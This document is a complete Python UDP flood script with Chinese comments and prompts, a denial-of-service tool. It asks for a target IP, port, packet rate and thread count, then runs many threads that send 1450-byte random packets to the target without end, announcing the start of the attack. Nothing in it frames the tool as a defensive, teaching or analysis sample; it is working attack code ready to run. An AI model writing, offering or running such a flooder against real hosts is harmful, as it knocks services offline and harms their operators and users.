import socket
import threading
import random
import time


class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    END = '\033[0m'

# 创建一个UDP套接字
def create_socket():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        return s
    except socket.error as msg:
        print(Colors.RED + "Socket creation error: " + str(msg))

# 发送UDP数据包
def send_udp_packet(s, ip, port, thread_number, packet_per_second, lock):
    while True:
        start_time = time.time()
        for _ in range(packet_per_second):
            # 生成随机数据
            packet = random._urandom(1450)
            try:
                # 发送数据包
                s.sendto(packet, (ip, port))
            except socket.error as msg:
                print(Colors.RED + "Error sending packet: " + str(msg))
        
        with lock:
            print(Colors.MAGENTA + f"[!] 正在发送UDP数据包到 --> {ip}:{port} 中... | 来自线程 --> {thread_number} | 发送成功!!!")

def main():
    s = create_socket()
    
    target_ip = input(Colors.CYAN + "[*]请输入目标IP : ")
    target_port = int(input(Colors.CYAN + "[*]请输入目标端口 : "))
    packet_per_second = int(input(Colors.BLUE + "[+]请输入每秒发包数/s: "))
    thread_count = int(input(Colors.GREEN + "[+]请输入线程(建议100线程左右多了流量杀手): "))
    print(Colors.BLUE + "[!]开始攻击!!!")
    
    # 创建线程锁
    lock = threading.Lock()
    
    # 创建线程池
    threads = []
    for i in range(thread_count):
        thread = threading.Thread(target=send_udp_packet, args=(s, target_ip, target_port, i+1, packet_per_second // thread_count, lock))
        thread.daemon = True
        thread.start()
        threads.append(thread)
    
    # 等待线程完成
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
